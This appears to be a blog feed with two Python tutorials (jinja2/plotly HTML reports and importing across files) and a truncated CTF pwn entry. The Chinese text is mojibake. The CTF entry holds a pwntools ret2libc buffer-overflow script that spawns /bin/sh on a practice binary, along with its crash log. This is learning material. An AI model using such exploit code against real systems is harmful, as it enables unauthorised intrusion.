class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;script src=&quot;https://cdn.plot.ly/plotly-latest.min.js&quot;&gt;&lt;/script&gt;<br><br># æŠ¥å‘Šæ ‡é¢˜<br><br>&#123;&#123; summary &#125;&#125;<br><br>## è¯¦ç»†æ•°æ®<br><br>&#123;&#123; table &#125;&#125;<br><br>## æ•°æ®å¯è§†åŒ–<br><br>&#123;&#123; chart &#125;&#125;<br></code></pre></td></tr></table></figure><p>æŠŠè¿™ä»½MDæ–‡ä»¶å¯¼å‡ºä¸ºhtmlï¼Œå‘½åä¸ºâ€Template.htmlâ€œï¼Œå¹¶æ”¾åœ¨Pythonä»£ç çš„åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œè¿™æ ·æ¨¡æ¿å°±å‡†å¤‡å¥½äº†ã€‚</p><h2 id="äºŒã€ç”¨jinja2å¯¼å…¥æ¨¡æ¿"><a href="#äºŒã€ç”¨jinja2å¯¼å…¥æ¨¡æ¿" class="headerlink" title="äºŒã€ç”¨jinja2å¯¼å…¥æ¨¡æ¿"></a>äºŒã€ç”¨jinja2å¯¼å…¥æ¨¡æ¿</h2><blockquote><p><a href="http://docs.jinkan.org/docs/jinja2/index.html">æ¬¢è¿æ¥åˆ° Jinja2 â€” Jinja2 2.7 documentation (jinkan.org)</a></p></blockquote><p><code>jinja2</code>æ˜¯ä¸€ä¸ªå¤„ç†htmlçš„æ¨¡æ¿å¼•æ“ã€‚æˆ‘åªå­¦åˆ°äº†ä¸€ä¸ªè¯­æ³•ï¼Œå°±æ˜¯åœ¨æ¨¡æ¿ä¸­çš„ <code>&#123;&#123; &#125;&#125;</code> ç”¨æ³•ç±»ä¼¼äºå­—ç¬¦ä¸²çš„formatå‡½æ•°ã€‚</p><p>ç”¨<code>Jinja2</code>è½½å…¥æ¨¡æ¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jinja2<br><br>env = jinja2.Environment(loader=jinja2.FileSystemLoader(searchpath=<span class="hljs-string">&#x27;&#x27;</span>))<br>template = env.get_template(<span class="hljs-string">&#x27;Template.html&#x27;</span>)<br><br>summary = <span class="hljs-string">u&quot;è¿™æ˜¯ä¸€äº›æ–‡å­—&quot;</span><br><br><span class="hljs-comment"># è¾“å‡ºæ•°æ®è¡¨æ ¼çš„ä»£ç </span><br>table = <span class="hljs-string">u&quot;åé¢æ¥åˆ¶ä½œæ•°æ®è¡¨æ ¼&quot;</span><br><br><span class="hljs-comment"># è¾“å‡ºå›¾è¡¨çš„ä»£ç </span><br>chart = <span class="hljs-string">u&quot;åé¢æ¥åˆ¶ä½œå›¾ç‰‡&quot;</span><br><br><span class="hljs-comment"># å¯¼å‡ºå›¾ç‰‡å¹¶ä¿å­˜</span><br><span class="hljs-comment"># è¯­æ³•å’Œformatç±»ä¼¼ï¼Œâ€˜=â€™å‰é¢æ˜¯htmlæ¨¡æ¿çš„&#123;&#123; &#125;&#125;ä¸­çš„å˜é‡åï¼Œåé¢æ˜¯è¦å¯¼å…¥çš„å†…å®¹ï¼Œæˆ‘å–œæ¬¢ç”¨ä¸€æ ·çš„åå­—ï¼Œæ¯”è¾ƒå®¹æ˜“è¯†åˆ«</span><br>html = template.render(summary=summary, table=table, chart=chart)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Report.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(html)<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¾—åˆ°äº†ä¸€ä»½Reportçš„htmlæ–‡ä»¶ã€‚å…¶ä¸­çš„æ•°æ®è¡¨æ ¼å’Œå›¾æš‚æ—¶éƒ½æ˜¯ç”¨å­—ç¬¦ä¸²ä»£æ›¿çš„ã€‚æ¥ä¸‹æ¥è®²æ€ä¹ˆæ’å…¥æ•°æ®å’Œå›¾ã€‚</p><h2 id="ä¸‰ã€ç”¨Pandasè¾“å‡ºè¡¨æ ¼"><a href="#ä¸‰ã€ç”¨Pandasè¾“å‡ºè¡¨æ ¼" class="headerlink" title="ä¸‰ã€ç”¨Pandasè¾“å‡ºè¡¨æ ¼"></a>ä¸‰ã€ç”¨<code>Pandas</code>è¾“å‡ºè¡¨æ ¼</h2><p>å¯ä»¥ç”¨<code>df.to_html</code>æŠŠæ•°æ®è¡¨æ ¼å˜æˆhtmlæ ¼å¼æ’å…¥ç½‘é¡µï¼Œè¿˜å¯ä»¥ç”¨<code>df.style</code>åŠŸèƒ½å¯¹æ•°æ®è¡¨åšä¸€äº›é«˜äº®ç­‰æ“ä½œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># ç®€å•çš„æ•°æ®è¡¨æ ¼</span><br>df = pd.DataFrame(np.random.randn(<span class="hljs-number">5</span>, <span class="hljs-number">4</span>), columns=[<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;two&#x27;</span>, <span class="hljs-string">&#x27;three&#x27;</span>, <span class="hljs-string">&#x27;four&#x27;</span>],<br>                  index=[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>])<br><br><span class="hljs-comment"># è¾“å‡ºä¸ºhtml</span><br>table = df.to_html()<br></code></pre></td></tr></table></figure><h2 id="å››ã€ç”¨plotlyè¿›è¡Œæ•°æ®å¯è§†åŒ–å¹¶æ’å…¥ç½‘é¡µ"><a href="#å››ã€ç”¨plotlyè¿›è¡Œæ•°æ®å¯è§†åŒ–å¹¶æ’å…¥ç½‘é¡µ" class="headerlink" title="å››ã€ç”¨plotlyè¿›è¡Œæ•°æ®å¯è§†åŒ–å¹¶æ’å…¥ç½‘é¡µ"></a>å››ã€ç”¨<code>plotly</code>è¿›è¡Œæ•°æ®å¯è§†åŒ–å¹¶æ’å…¥ç½‘é¡µ</h2><p><a href="https://plotly.com/python/">Plotly Python Graphing Library</a></p><p><a href="https://images.plot.ly/plotly-documentation/images/python_cheat_sheet.pdf">python_cheat_sheet.pdf (plot.ly)</a></p><p><code>plotly</code>æœ¬èº«å°±æ˜¯ä¸€ä¸ªäº¤äº’å¼çš„æ•°æ®å¯è§†åŒ–åŒ…ã€‚æˆ‘ä»¬ç”¨<code>plotly.offline.plot</code>å¯ä»¥ç›´æ¥è¾“å‡ºå›¾ç‰‡å†…å®¹ä¸ºç½‘é¡µæ ¼å¼ã€‚ä¸ºäº†æŠŠå›¾ç‰‡æ’å…¥åˆ°æˆ‘ä»¬çš„æŠ¥å‘Šé‡Œï¼Œæˆ‘ä»¬éœ€è¦plotlyä¸è¦è¾“å‡ºå®Œæ•´htmlï¼Œè€Œåªæ˜¯åŒ…å«æ•°æ®çš„divã€‚æ‰€ä»¥å‰é¢æåˆ°äº†æŠŠplotlyçš„jså¼•ç”¨åŠ åˆ°æˆ‘ä»¬çš„æ¨¡æ¿å‰é¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> plotly <span class="hljs-keyword">as</span> py<br><span class="hljs-keyword">import</span> plotly.express <span class="hljs-keyword">as</span> px<br><br><span class="hljs-comment"># ç”»ä¸€ä¸ªç®±å‹å›¾ã€‚</span><br>fig = px.box(data_frame=df, x=<span class="hljs-string">&#x27;one&#x27;</span>, y=<span class="hljs-string">&#x27;two&#x27;</span>)<br>chart = py.offline.plot(fig, include_plotlyjs=<span class="hljs-literal">False</span>, output_type=<span class="hljs-string">&#x27;div&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥æŠŠæ‰€æœ‰çš„è¡¨æ ¼å’Œå›¾ç‰‡æ’å…¥æŠ¥å‘Šé‡Œäº†ã€‚é‡æ–°è¿è¡Œä¸€ä¸‹å‰é¢ä¿å­˜æ–‡ä»¶çš„ä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">html = template.render(summary=summary, table=table, chart=chart)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Report.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(html)<br></code></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œä¸€ä»½å®Œæ•´çš„htmlæ ¼å¼çš„æ•°æ®æŠ¥å‘Šå°±åšå¥½äº†ã€‚ä½ å¯ä»¥æŠŠè¿™ä»½ä»£ç ä½œä¸ºä½ æ•´ä¸ªæ•°æ®åˆ†æpipelineçš„ä¸€éƒ¨åˆ†ï¼Œæ¯æ¬¡çš„åˆ†æç»“æœéƒ½å¯ä»¥è‡ªåŠ¨ç”Ÿæˆä¸€ä»½æŠ¥å‘Šã€‚</p><p><a href="https://blog.csdn.net/weixin_38037405/article/details/124323127">(5æ¡æ¶ˆæ¯) Plotlyï¼šæœ€å¼ºPythonå¯è§†åŒ–åº“ï¼Œæ²¡æœ‰ä¹‹ä¸€_æˆ‘çˆ±Pythonæ•°æ®æŒ–æ˜çš„åšå®¢-CSDNåšå®¢_plotly</a></p><p><a href="https://www.jianshu.com/p/57bad75139ca">python plotly ä½¿ç”¨æ•™ç¨‹ - ç®€ä¹¦ (jianshu.com)</a></p><p><a href="https://blog.csdn.net/zhouchen1998/article/details/108976110">(5æ¡æ¶ˆæ¯) PlotlyåŸºç¡€æ•™ç¨‹_å‘¨å…ˆæ£®çˆ±åƒç´ çš„åšå®¢-CSDNåšå®¢_plotly</a></p><p><a href="https://zhuanlan.zhihu.com/p/441617577">æ•°æ®ç§‘å­¦å®¶å¿…å¤‡ï½œä½¿ç”¨jupyterç”Ÿæˆhtmlæ ¼å¼æŠ¥å‘Š - çŸ¥ä¹ (zhihu.com)</a></p><p><a href="https://blog.csdn.net/xuezhangjun0121/article/details/96288810">(5æ¡æ¶ˆæ¯) HTMLæµ‹è¯•æŠ¥å‘Šæ¨¡æ¿_Saggitarxmçš„åšå®¢-CSDNåšå®¢_htmlæŠ¥å‘Šæ¨¡æ¿</a></p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
      <tag>HTML report</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pythonè·¨æ–‡ä»¶è°ƒç”¨å‡½æ•°</title>
    <link href="/2022/06/08/Code/Python/Python%E8%B7%A8%E6%96%87%E4%BB%B6%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <url>/2022/06/08/Code/Python/Python%E8%B7%A8%E6%96%87%E4%BB%B6%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Pythonè·¨æ–‡ä»¶è°ƒç”¨å‡½æ•°"><a href="#Pythonè·¨æ–‡ä»¶è°ƒç”¨å‡½æ•°" class="headerlink" title="Pythonè·¨æ–‡ä»¶è°ƒç”¨å‡½æ•°"></a>Pythonè·¨æ–‡ä»¶è°ƒç”¨å‡½æ•°</h1><blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/Gou_Hailong/article/details/124295301">https://blog.csdn.net/Gou_Hailong/article/details/124295301</a></p></blockquote><p>åœ¨å¾ˆå¤šæ—¶å€™ï¼Œä¸ºäº†ä¿æŒä»£ç ä¸ä»£ç æ–‡ä»¶çš„ç®€æ´å’Œé€»è¾‘æ¸…æ™°ï¼Œé€šå¸¸ä¼šå°†è®¸å¤šç›¸ç±»ä¼¼çš„å‡½æ•°æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ä¸€ä¸ª main.py ä¸­å»è°ƒç”¨å®ƒä»¬ã€‚è°ƒç”¨ Python å‡½æ•°çš„æ—¶å€™ï¼Œå¤§è‡´ä¼šå­˜åœ¨å¦‚ä¸‹å‡ ç§æƒ…å†µ ã€‚</p><h2 id="ä¸€ã€é¡¹ç›®ç®€ä»‹"><a href="#ä¸€ã€é¡¹ç›®ç®€ä»‹" class="headerlink" title="ä¸€ã€é¡¹ç›®ç®€ä»‹"></a>ä¸€ã€é¡¹ç›®ç®€ä»‹</h2><p>å‡å¦‚ç°åœ¨æœ‰è¿™æ ·ä¸€ä¸ªæ–‡ä»¶æ ‘ï¼ˆä»å…¶ä»–åœ°æ–¹copyçš„ï¼Œç¨åŠ æ•´æ”¹ï¼‰</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">A</span><br>   <span class="hljs-string">|--------</span> <span class="hljs-string">__init__.py</span><br>   <span class="hljs-string">|--------</span> <span class="hljs-string">a.py</span><br>   <span class="hljs-string">|--------</span> <span class="hljs-string">main.py</span><br>   <span class="hljs-string">|--------</span> <span class="hljs-string">B</span><br>         <span class="hljs-string">|--------</span> <span class="hljs-string">__init__.py</span><br>         <span class="hljs-string">|--------</span> <span class="hljs-string">b.py</span><br>   <span class="hljs-string">|--------</span> <span class="hljs-string">C</span><br>         <span class="hljs-string">|--------</span> <span class="hljs-string">__init__.py</span><br>         <span class="hljs-string">|--------</span> <span class="hljs-string">c.py</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># a.py</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">a_hello</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A_HELLO&quot;</span>)<br>----------------------------<br><span class="hljs-comment"># b.py</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b_hello</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;B_HELLO&quot;</span>)<br>----------------------------<br><span class="hljs-comment"># c.py</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">c_hello</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;C_HELLO&quot;</span>)<br>----------------------------<br><span class="hljs-comment"># main.py</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main_hello</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN_HELLO&quot;</span>)<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¦æœ‰ <code>__init__.py</code> æ–‡ä»¶å‘¢ï¼Ÿ</p><p>åœ¨Pythonå·¥ç¨‹é‡Œï¼Œå½“pythonæ£€æµ‹åˆ°ä¸€ä¸ªç›®å½•ä¸‹å­˜åœ¨ <code>__init__.py</code> æ–‡ä»¶æ—¶ï¼Œpythonå°±ä¼šæŠŠå®ƒå½“æˆä¸€ä¸ªæ¨¡å—(module)ã€‚Moduleè·ŸCï¼‹ï¼‹çš„å‘½åç©ºé—´å’Œ Java çš„Packageçš„æ¦‚å¿µå¾ˆåƒï¼Œéƒ½æ˜¯ä¸ºäº†ç§‘å­¦åœ°ç»„ç»‡åŒ–å·¥ç¨‹ï¼Œç®¡ç†å‘½åç©ºé—´ã€‚</p><p><code>__init__.py</code> å¯ä»¥æ˜¯ä¸€ä¸ªç©ºæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æœ‰éå¸¸ä¸°å¯Œçš„å†…å®¹ã€‚</p><h2 id="äºŒã€è°ƒç”¨ç±»å‹"><a href="#äºŒã€è°ƒç”¨ç±»å‹" class="headerlink" title="äºŒã€è°ƒç”¨ç±»å‹"></a>äºŒã€è°ƒç”¨ç±»å‹</h2><h3 id="1ã€è°ƒç”¨åŒæ–‡ä»¶ä¸­çš„å‡½æ•°"><a href="#1ã€è°ƒç”¨åŒæ–‡ä»¶ä¸­çš„å‡½æ•°" class="headerlink" title="1ã€è°ƒç”¨åŒæ–‡ä»¶ä¸­çš„å‡½æ•°"></a>1ã€è°ƒç”¨åŒæ–‡ä»¶ä¸­çš„å‡½æ•°</h3><p>è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œæ¯”å¦‚æˆ‘æƒ³åœ¨ main.py ä¸­è°ƒç”¨ <code>main_hello()</code> å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ç›´æ¥ <code>main_hello()</code> å³å¯</p><h3 id="2ã€è°ƒç”¨åŒç›®å½•ä¸‹ä¸åŒæ–‡ä»¶ä¸­çš„å‡½æ•°"><a href="#2ã€è°ƒç”¨åŒç›®å½•ä¸‹ä¸åŒæ–‡ä»¶ä¸­çš„å‡½æ•°" class="headerlink" title="2ã€è°ƒç”¨åŒç›®å½•ä¸‹ä¸åŒæ–‡ä»¶ä¸­çš„å‡½æ•°"></a>2ã€è°ƒç”¨åŒç›®å½•ä¸‹ä¸åŒæ–‡ä»¶ä¸­çš„å‡½æ•°</h3><p>æ¯”å¦‚æˆ‘æƒ³åœ¨ main.py ä¸­è°ƒç”¨ a.py ä¸­çš„ <code>a_hello()</code> å‡½æ•°ï¼Œå¯åšå¦‚ä¸‹æ“ä½œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> a<br>a.a_hello()<br></code></pre></td></tr></table></figure><h3 id="3ã€è°ƒç”¨åŒçº§æ–‡ä»¶å¤¹æ–‡ä»¶ä¸­çš„å‡½æ•°"><a href="#3ã€è°ƒç”¨åŒçº§æ–‡ä»¶å¤¹æ–‡ä»¶ä¸­çš„å‡½æ•°" class="headerlink" title="3ã€è°ƒç”¨åŒçº§æ–‡ä»¶å¤¹æ–‡ä»¶ä¸­çš„å‡½æ•°"></a>3ã€è°ƒç”¨åŒçº§æ–‡ä»¶å¤¹æ–‡ä»¶ä¸­çš„å‡½æ•°</h3><p>æ¯”å¦‚æˆ‘æƒ³åœ¨ main.py ä¸­è°ƒç”¨æ–‡ä»¶å¤¹ B ä¸‹ b.py ä¸­çš„ <code>b_hello()</code> å‡½æ•°ï¼Œå¯åšå¦‚ä¸‹æ“ä½œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> B <span class="hljs-keyword">import</span> b<br>b.b_hello()<br></code></pre></td></tr></table></figure><h3 id="4ã€è°ƒç”¨ä¸Šä¸€çº§æ–‡ä»¶å¤¹æ–‡ä»¶ä¸­çš„å‡½æ•°"><a href="#4ã€è°ƒç”¨ä¸Šä¸€çº§æ–‡ä»¶å¤¹æ–‡ä»¶ä¸­çš„å‡½æ•°" class="headerlink" title="4ã€è°ƒç”¨ä¸Šä¸€çº§æ–‡ä»¶å¤¹æ–‡ä»¶ä¸­çš„å‡½æ•°"></a>4ã€è°ƒç”¨ä¸Šä¸€çº§æ–‡ä»¶å¤¹æ–‡ä»¶ä¸­çš„å‡½æ•°</h3><p>æ¯”å¦‚æˆ‘æƒ³åœ¨ c.py ä¸­è°ƒç”¨ a.py ä¸­çš„å‡½æ•°ï¼Œè¿™æ—¶å€™å¦‚æœç”¨ä¸Šé¢çš„æ–¹æ³•å°±ä¼šæŠ¥é”™ No module named xx ã€‚è§£å†³æ–¹æ³•å°±æ˜¯å°†ç›®å½• A åŠ åˆ°ç³»ç»Ÿè·¯å¾„ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>sys.path.append(<span class="hljs-string">&#x27;E:\\testnow\\A&#x27;</span>)   <span class="hljs-comment">#æ‹¬å·å†…å®¹ä¸ºæ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œ<code>sys.path</code> æ·»åŠ ç›®å½•æ—¶æ³¨æ„æ˜¯åœ¨ windows è¿˜æ˜¯åœ¨ linux ä¸‹ï¼Œwindows ä¸‹éœ€è¦ç”¨ <code>\\</code> ï¼Œlinux ä¸‹éœ€è¦ç”¨ <code>/</code> å¦åˆ™ä¼šå‡ºé”™ã€‚è¿™æ ·éœ€è¦åŒºåˆ†æ“ä½œç³»ç»Ÿï¼Œè€Œä¸”éœ€è¦çŸ¥é“ç»å¯¹è·¯å¾„ï¼Œå²‚ä¸æ˜¯å¾ˆä¸å¥½ç”¨ã€‚çœ‹åˆ°æœ‰å¤§ä½¬ç”¨åˆ°è¿‡å¦‚ä¸‹æ“ä½œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br>sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), <span class="hljs-string">&#x27;..&#x27;</span>)))<br></code></pre></td></tr></table></figure><p>ä¸Šé¢è¿™å¥è¯å¾ˆé•¿ï¼Œä½†ä¹Ÿä¸éš¾ç†è§£ï¼Œ<code>os.path.dirname(__file__)</code> è·å–å½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œ<code>os.path.join(xx,&#39;..&#39;)</code> åœ¨åé¢è¿½åŠ  <code>..</code> ï¼Œç›¸å½“äºè¿›å…¥ä¸Šä¸€çº§ç›®å½•ï¼Œç„¶åå† <code>os.path.abspath(xx)</code> è·å–ç»å¯¹è·¯å¾„ï¼Œæœ€å <code>sys.path.append()</code> å°†å…¶åŠ å…¥ç³»ç»Ÿè·¯å¾„å½“ä¸­ã€‚ç»è¿‡è¿™äº›æ“ä½œä¹‹åï¼Œè¢«åŠ å…¥ç³»ç»Ÿè·¯å¾„ä¸­çš„æ‰€æœ‰æ–‡ä»¶ä¸­çš„å‡½æ•°éƒ½å¯ä»¥è¢«è°ƒç”¨äº†ã€‚</p><h2 id="ä¸‰ã€æ¦‚å¿µåŒºåˆ†"><a href="#ä¸‰ã€æ¦‚å¿µåŒºåˆ†" class="headerlink" title="ä¸‰ã€æ¦‚å¿µåŒºåˆ†"></a>ä¸‰ã€æ¦‚å¿µåŒºåˆ†</h2><p>Python æ¨¡å—(Module)ï¼Œæ˜¯ä¸€ä¸ª Python æ–‡ä»¶ï¼Œä»¥ <code>.py</code> ç»“å°¾ï¼ŒåŒ…å«äº† Python å¯¹è±¡å®šä¹‰å’Œ Python è¯­å¥ã€‚</p><p>Python åŒ…æ˜¯ä¸€ä¸ªåˆ†å±‚æ¬¡çš„æ–‡ä»¶ç›®å½•ç»“æ„ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªç”±æ¨¡å—åŠå­åŒ…ï¼Œå’Œå­åŒ…ä¸‹çš„å­åŒ…ç­‰ç»„æˆçš„ Python çš„åº”ç”¨ç¯å¢ƒã€‚ç®€å•æ¥è¯´ï¼ŒåŒ…å°±æ˜¯æ–‡ä»¶å¤¹ï¼Œä½†è¯¥æ–‡ä»¶å¤¹ä¸‹å¿…é¡»å­˜åœ¨ <code>__init__.py</code> æ–‡ä»¶ï¼Œ è¯¥æ–‡ä»¶çš„å†…å®¹å¯ä»¥ä¸ºç©ºã€‚<code>__init__.py</code> ç”¨äºæ ‡è¯†å½“å‰æ–‡ä»¶å¤¹æ˜¯ä¸€ä¸ªåŒ…ã€‚</p><p>æ–‡ä»¶å¤¹ï¼šæ–‡ä»¶å¤¹å°±æ˜¯ä¸å­˜åœ¨ <code>__init__.py</code> æ–‡ä»¶çš„æ–‡ä»¶å¤¹ã€‚</p><p>å¦å¤–ï¼Œå¯¹äºå¯¼å…¥æ¨¡å—å¯ä»¥ä½¿ç”¨ <code>import model1</code> æˆ– <code>from model1 import func1, func2, ...</code> ã€‚å…¶å®ï¼Œè¿™ä¸¤ç§æ–¹å¼çœ‹ä¼¼ä¸€æ ·ï¼Œä½†æ˜¯æ˜¯æœ‰æ‰€åŒºåˆ«çš„ï¼Œå…·ä½“è¯·çœ‹ï¼š<a href="https://blog.csdn.net/Gou_Hailong/article/details/125169752">https://blog.csdn.net/Gou_Hailong/article/details/125169752</a></p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Some Problems</title>
    <link href="/2022/05/30/CTF/Pwn/Problem/"/>
    <url>/2022/05/30/CTF/Pwn/Problem/</url>
    
    <content type="html"><![CDATA[<h1 id="Some-Problems"><a href="#Some-Problems" class="headerlink" title="Some Problems"></a>Some Problems</h1><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br>io.recv()<br><br><span class="hljs-comment">#system_plt = 0x08048460</span><br><span class="hljs-comment">#bin_sh = 0x08048720</span><br>elf = ELF(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br>system_plt = elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br>bin_sh = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>, system_plt, <span class="hljs-number">0xdeadbeef</span>, bin_sh])<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>æŠ¥é”™ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">ROP$</span><span class="bash"> python3 exp4.py</span><br>[+] Starting local process &#x27;./ret2libc1&#x27;: pid 6683<br>[*] &#x27;/home/pwn/æ¡Œé¢/é¢˜ç›®/ROP/ret2libc1&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br>0x8048720<br>[*] Switching to interactive mode<br>[*] Got EOF while reading in interactive<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>[*] Process &#x27;./ret2libc1&#x27; stopped with exit code -11 (SIGSEGV) (pid 6683)<br>[*] Got EOF while sending in interactive<br></code></pre></td></tr></table></figure><p><code>python</code> ä¸­çš„å‡½æ•° <code>hex()</code> è¿”å›16è¿›åˆ¶æ•°ï¼Œä»¥å­—ç¬¦ä¸²å½¢å¼è¡¨ç¤ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span 